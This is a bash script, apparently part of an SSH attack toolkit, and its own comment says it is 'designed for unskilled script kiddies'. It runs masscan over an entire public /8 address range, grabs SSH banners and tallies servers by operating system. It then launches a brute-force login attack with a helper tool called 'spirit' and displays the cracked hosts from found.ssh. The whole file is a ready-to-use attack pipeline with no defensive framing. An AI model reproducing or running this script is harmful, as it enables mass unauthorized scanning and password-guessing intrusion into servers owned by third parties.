#!/bin/bash
set -e

# Designed for unskilled script kiddies and the sort...

if [ $# != 3 ]; then
    echo -e "[-] \e[31mUsage example: $0 <class-A> <port1,port2,port3> <speed> \e[0m"
    exit
fi
clear

echo -e "[+] increasing system limits"
ulimit -n 65535

echo -e "[+] starting masscan on network [$1.0.0.0/8] port [$2] with speed [$3]"
./masscan \
--range "$1".0.0.0-"$1".255.255.255 \
--ports "$2" \
--max-rate "$3" \
--exclude 255.255.255.255 \
--exclude 10.0.0.0/8 \
--exclude 192.168.0.0/16 \
--exclude 127.0.0.0/8 \
--interactive \
-oG open.lst

HOSTS=$(wc -l < open.lst) &>/dev/null
echo -e "[+] masscan found [$HOSTS] hosts on port/s [$2]"

echo -e "[+] parsing masscan output"
./spirit parse

echo -e "[+] starting banner grabber"
./spirit banner

ALL=$(wc -l < b.lst) &>/dev/null
ubuntu=$(grep -c Ubuntu b.lst) &>/dev/null
debian=$(grep -c Debian b.lst) &>/dev/null
freebsd=$(grep -c FreeBSD b.lst) &>/dev/null
other=$(grep -v FreeBSD b.lst |grep -v Debian b.lst |grep -v Ubuntu -c b.lst) &>/dev/null

echo -e "[*]            Found \e[92m[$ALL]\e[0m SSH servers"
echo -e "[*]            Ubuntu: \e[93m[$ubuntu]\e[0m"
echo -e "[*]            Debian: \e[93m[$debian]\e[0m"
echo -e "[*]            FreeBSD: \e[93m[$freebsd]\e[0m"
echo -e "[*]            Others: \e[93m[$other]\e[0m"

cat <b.lst|sort|uniq|shuf>h.lst

echo -e "[+] starting brute-force attack"
./spirit brute

echo -e "[+] done, let's see what we've found:"
sleep 3
head -n20 found.ssh
